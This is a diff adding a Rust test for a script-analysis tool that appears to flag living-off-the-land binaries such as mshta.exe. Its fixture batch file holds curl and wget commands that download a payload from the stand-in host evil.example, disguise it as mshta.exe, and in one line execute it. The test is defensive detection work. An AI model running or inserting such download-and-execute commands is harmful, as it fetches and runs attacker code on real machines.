@@ -1697,6 +1697,62 @@ fn summarize_lolbas_enrichment_ignores_program_names_in_downloader_short_metadat
 }
 
 #[test]
+fn summarize_lolbas_enrichment_ignores_program_names_in_attached_downloader_destinations() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "curl --output:C:\\Temp\\mshta.exe http://evil.example/payload.bin\r\n\
+         curl --output-dir:C:\\Temp\\mshta.exe --remote-name http://evil.example/payload.bin\r\n\
+         wget --output-document:C:\\Temp\\mshta.exe http://evil.example/payload.bin\r\n\
+         wget --directory-prefix:C:\\Temp\\mshta.exe http://evil.example/payload.bin\r\n\
+         curl --output:C:\\Temp\\payload.bin http://evil.example/payload.bin && C:\\Temp\\mshta.exe\r\n",
+    )
+    .expect("write input");
+    let lolbas = dir.path().join("lolbas.json");
+    fs::write(
+        &lolbas,
+        r#"[
+          {
+            "Name": "Mshta.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+            "Commands": [
+              {
+                "Category": "Execute",
+                "MitreID": "T1218.005"
+              }
+            ]
+          }
+        ]"#,
+    )
+    .expect("write lolbas");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "summarize",
+            input.to_str().expect("input path"),
+            "--lolbas-json",
+            lolbas.to_str().expect("lolbas path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
+    let matches = v
+        .get("lolbas_matches")
+        .and_then(|v| v.as_array())
+        .expect("lolbas_matches array");
+    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
+    assert_eq!(
+        matches[0].get("command").and_then(|v| v.as_str()),
+        Some("C:\\Temp\\mshta.exe")
+    );
+}
+
+#[test]
 fn summarize_lolbas_enrichment_ignores_program_names_in_wget_metadata() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
